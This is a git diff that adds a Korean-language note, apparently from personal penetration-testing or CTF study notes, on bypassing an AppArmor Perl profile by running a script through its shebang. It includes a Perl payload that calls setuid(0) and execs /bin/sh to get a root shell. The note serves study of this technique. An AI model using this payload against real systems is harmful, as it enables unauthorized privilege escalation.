@@ -1,4 +1,56 @@
-# Linux Privilege Escalation
+<details>
+  <summary><strong>AppArmor Bypass via Shebang</strong></summary>
+
+## AppArmor란?
+- 프로그램별로 접근 가능한 파일/디렉토리를 제한하는 보안 시스템
+- 프로필이 있는 프로그램만 제한 (없으면 일반 권한만 체크)
+- 프로필 위치: /etc/apparmor.d/
+
+## Shebang이란?
+- 스크립트 첫 줄의 #!인터프리터경로
+- 스크립트를 어떤 프로그램으로 실행할지 지정
+- ./script.sh 처럼 직접 실행 가능하게 함
+
+## 취약점: Shebang Bypass
+**두 가지 실행 방식의 차이:**
+
+방법 1: perl 직접 호출 (차단됨)
+```bash
+perl exploit.pl
+```
+→ AppArmor가 "perl" 실행을 감지
+→ /etc/apparmor.d/usr.bin.perl 프로필 적용
+→ deny /root/* 규칙으로 차단 ❌
+
+방법 2: Shebang 실행 (우회됨)
+```bash
+./exploit.pl
+```
+→ AppArmor가 "exploit.pl" 실행을 감지
+→ exploit.pl 프로필 없음 → 통과
+→ Shebang(#!/usr/bin/perl)이 perl 호출
+→ 이미 AppArmor 체크 끝남 → 제한 없음 ✅
+
+## 공격 방법
+1. exploit.pl 작성
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh";
+
+2. 실행 권한 부여
+chmod +x exploit.pl
+
+3. Shebang으로 실행
+./exploit.pl → root shell!
+
+## 핵심
+AppArmor는 "직접 호출된" 프로그램만 체크
+Shebang의 "간접 호출"은 감지 못함 (설계상 버그)
+
+
+  
+</details>
 
 ## Add New Root User
 ```bash
